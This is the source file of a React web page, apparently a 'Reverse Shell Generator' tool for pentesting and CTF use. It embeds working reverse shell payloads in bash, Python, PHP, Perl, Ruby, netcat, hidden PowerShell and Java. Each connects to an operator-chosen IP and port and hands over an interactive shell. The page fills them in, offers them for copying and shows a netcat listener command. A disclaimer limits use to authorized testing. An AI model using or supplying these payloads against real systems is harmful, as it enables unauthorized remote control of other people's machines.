"use client"

import React, { useState } from 'react';
import { Copy, Check, Info, Shield, Terminal } from 'lucide-react';
import ToolPageLayout from '@/components/ui/ToolPageLayout';

type ShellType = 'bash' | 'python' | 'php' | 'perl' | 'ruby' | 'nc' | 'powershell' | 'java';

interface ShellTemplate {
    id: ShellType;
    name: string;
    description: string;
    template: string;
    color: string;
}

const shells: ShellTemplate[] = [
    {
        id: 'bash',
        name: 'Bash',
        description: 'Standard bash reverse shell',
        template: `bash -i >& /dev/tcp/{IP}/{PORT} 0>&1`,
        color: 'bg-green-500'
    },
    {
        id: 'python',
        name: 'Python',
        description: 'Python reverse shell (works on most systems)',
        template: `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{IP}",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`,
        color: 'bg-blue-500'
    },
    {
        id: 'php',
        name: 'PHP',
        description: 'PHP reverse shell for web servers',
        template: `php -r '$sock=fsockopen("{IP}",{PORT});exec("/bin/sh -i <&3 >&3 2>&3");'`,
        color: 'bg-purple-500'
    },
    {
        id: 'perl',
        name: 'Perl',
        description: 'Perl reverse shell',
        template: `perl -e 'use Socket;$i="{IP}";$p={PORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
        color: 'bg-orange-500'
    },
    {
        id: 'ruby',
        name: 'Ruby',
        description: 'Ruby reverse shell',
        template: `ruby -rsocket -e'f=TCPSocket.open("{IP}",{PORT}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`,
        color: 'bg-red-500'
    },
    {
        id: 'nc',
        name: 'Netcat',
        description: 'Netcat reverse shell (traditional)',
        template: `nc -e /bin/sh {IP} {PORT}`,
        color: 'bg-cyan-500'
    },
    {
        id: 'powershell',
        name: 'PowerShell',
        description: 'Windows PowerShell reverse shell',
        template: `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("{IP}",{PORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()`,
        color: 'bg-indigo-500'
    },
    {
        id: 'java',
        name: 'Java',
        description: 'Java reverse shell',
        template: `r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{IP}/{PORT};cat <&5 | while read line; do \\$line 2>&5 >&5; done"] as String[])
p.waitFor()`,
        color: 'bg-yellow-500'
    }
];

const ReverseShellGenerator = () => {
    const [ip, setIp] = useState('');
    const [port, setPort] = useState('4444');
    const [selectedShell, setSelectedShell] = useState<ShellType>('bash');
    const [copiedId, setCopiedId] = useState<string | null>(null);

    const generateShell = (template: string) => {
        return template
            .replace(/{IP}/g, ip || 'YOUR_IP')
            .replace(/{PORT}/g, port || '4444');
    };

    const copyToClipboard = (id: string, text: string) => {
        navigator.clipboard.writeText(text);
        setCopiedId(id);
        setTimeout(() => setCopiedId(null), 2000);
    };

    const selectedShellData = shells.find(s => s.id === selectedShell)!;

    return (
        <ToolPageLayout
            title="Reverse Shell Generator"
            description="Generate reverse shell payloads for penetration testing and CTF challenges."
            icon={Terminal}
            badge="Exploitation Tool"
            tags={[
                { label: 'Pentesting', color: 'bg-red-500/10 text-red-400 border-red-500/30' },
                { label: 'CTF', color: 'bg-purple-500/10 text-purple-400 border-purple-500/30' },
            ]}
        >
            {/* Warning */}
            <div className="mb-6 p-4 rounded-xl bg-yellow-500/10 border border-yellow-500/20">
                <div className="flex items-start gap-3">
                    <Shield className="w-5 h-5 text-yellow-500 mt-0.5 flex-shrink-0" />
                    <div>
                        <p className="text-yellow-400 font-medium text-sm">Educational Purpose Only</p>
                        <p className="text-yellow-500/80 text-sm mt-1">
                            These payloads are for authorized penetration testing and CTF challenges only.
                            Unauthorized access to computer systems is illegal.
                        </p>
                    </div>
                </div>
            </div>

            {/* Configuration */}
            <div className="mb-8 p-5 rounded-xl border border-white/10 bg-white/[0.02]">
                <h2 className="text-white font-medium mb-4">Configuration</h2>
                <div className="grid sm:grid-cols-2 gap-4">
                    <div>
                        <label className="block text-sm text-gray-400 mb-2">
                            Listener IP Address
                        </label>
                        <input
                            type="text"
                            value={ip}
                            onChange={(e) => setIp(e.target.value)}
                            placeholder="10.10.14.1"
                            className="w-full px-4 py-2.5 bg-white/5 border border-white/10 rounded-lg text-white placeholder:text-gray-600 focus:border-orange-500/50 focus:outline-none transition-colors font-mono"
                        />
                    </div>
                    <div>
                        <label className="block text-sm text-gray-400 mb-2">
                            Listener Port
                        </label>
                        <input
                            type="text"
                            value={port}
                            onChange={(e) => setPort(e.target.value)}
                            placeholder="4444"
                            className="w-full px-4 py-2.5 bg-white/5 border border-white/10 rounded-lg text-white placeholder:text-gray-600 focus:border-orange-500/50 focus:outline-none transition-colors font-mono"
                        />
                    </div>
                </div>
                <div className="mt-4 p-3 rounded-lg bg-black/30 border border-white/5">
                    <p className="text-xs text-gray-500 flex items-center gap-2">
                        <Info className="w-3.5 h-3.5" />
                        Start listener with: <code className="text-orange-400 ml-1">nc -lvnp {port || '4444'}</code>
                    </p>
                </div>
            </div>

            {/* Shell Type Selector */}
            <div className="mb-6">
                <h2 className="text-white font-medium mb-3">Select Shell Type</h2>
                <div className="flex flex-wrap gap-2">
                    {shells.map((shell) => (
                        <button
                            key={shell.id}
                            onClick={() => setSelectedShell(shell.id)}
                            className={`px-4 py-2 rounded-lg text-sm font-medium transition-all ${selectedShell === shell.id
                                    ? 'bg-orange-500 text-white'
                                    : 'bg-white/5 text-gray-400 hover:text-white border border-white/10 hover:border-white/20'
                                }`}
                        >
                            {shell.name}
                        </button>
                    ))}
                </div>
            </div>

            {/* Selected Shell Output */}
            <div className="p-5 rounded-xl border border-white/10 bg-white/[0.02]">
                <div className="flex items-center justify-between mb-4">
                    <div className="flex items-center gap-3">
                        <div className={`w-3 h-3 rounded-full ${selectedShellData.color}`} />
                        <h3 className="text-white font-medium">{selectedShellData.name} Reverse Shell</h3>
                    </div>
                    <button
                        onClick={() => copyToClipboard(selectedShellData.id, generateShell(selectedShellData.template))}
                        className="flex items-center gap-2 px-3 py-1.5 rounded-lg bg-orange-500 hover:bg-orange-600 text-white text-sm transition-colors"
                    >
                        {copiedId === selectedShellData.id ? (
                            <>
                                <Check className="w-4 h-4" />
                                Copied!
                            </>
                        ) : (
                            <>
                                <Copy className="w-4 h-4" />
                                Copy
                            </>
                        )}
                    </button>
                </div>
                <p className="text-sm text-gray-500 mb-3">{selectedShellData.description}</p>
                <pre className="p-4 rounded-lg bg-black/50 border border-white/5 overflow-x-auto">
                    <code className="text-sm text-orange-400 whitespace-pre-wrap break-all">
                        {generateShell(selectedShellData.template)}
                    </code>
                </pre>
            </div>

            {/* All Shells Quick Reference */}
            <div className="mt-8">
                <h2 className="text-white font-medium mb-4">All Shells Quick Reference</h2>
                <div className="space-y-3">
                    {shells.map((shell) => (
                        <div
                            key={shell.id}
                            className="p-4 rounded-xl border border-white/10 bg-white/[0.02] hover:border-white/20 transition-colors"
                        >
                            <div className="flex items-start justify-between gap-4">
                                <div className="flex-1 min-w-0">
                                    <div className="flex items-center gap-2 mb-2">
                                        <div className={`w-2 h-2 rounded-full ${shell.color}`} />
                                        <h3 className="text-white font-medium text-sm">{shell.name}</h3>
                                    </div>
                                    <code className="block text-xs text-gray-500 bg-black/30 px-3 py-2 rounded-lg overflow-x-auto whitespace-pre-wrap break-all">
                                        {generateShell(shell.template)}
                                    </code>
                                </div>
                                <button
                                    onClick={() => copyToClipboard(`all-${shell.id}`, generateShell(shell.template))}
                                    className="p-2 rounded-lg border border-white/10 hover:border-white/20 text-gray-400 hover:text-white transition-colors flex-shrink-0"
                                >
                                    {copiedId === `all-${shell.id}` ? (
                                        <Check className="w-4 h-4 text-green-500" />
                                    ) : (
                                        <Copy className="w-4 h-4" />
                                    )}
                                </button>
                            </div>
                        </div>
                    ))}
                </div>
            </div>
        </ToolPageLayout>
    );
};

export default ReverseShellGenerator;
